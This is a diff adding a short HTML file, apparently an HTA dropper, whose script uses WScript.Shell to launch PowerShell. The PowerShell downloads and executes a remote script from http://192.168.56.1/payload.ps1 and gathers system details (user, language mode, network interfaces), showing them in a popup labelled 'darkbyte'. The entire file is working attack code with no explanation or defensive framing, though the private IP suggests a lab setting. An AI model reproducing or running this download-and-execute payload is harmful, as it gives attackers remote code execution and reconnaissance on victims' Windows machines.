@@ -1,0 +1,14 @@
+<html>
+<head>
+<script>
+  var shell = new ActiveXObject("WScript.Shell");
+  shell.Run("powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.1/payload.ps1')");
+  var exec = shell.Exec("powershell.exe -c echo 'USER:';whoami;echo '\nLANGUAGE MODE:';echo $ExecutionContext.SessionState.LanguageMode;echo '\nINTERFACES:';ipconfig");
+  var info = exec.StdOut.ReadAll();
+  shell.Popup(info,0,"darkbyte",0x1);
+  window.close();
+</script>
+</head>
+<body>
+</body>
+</html>
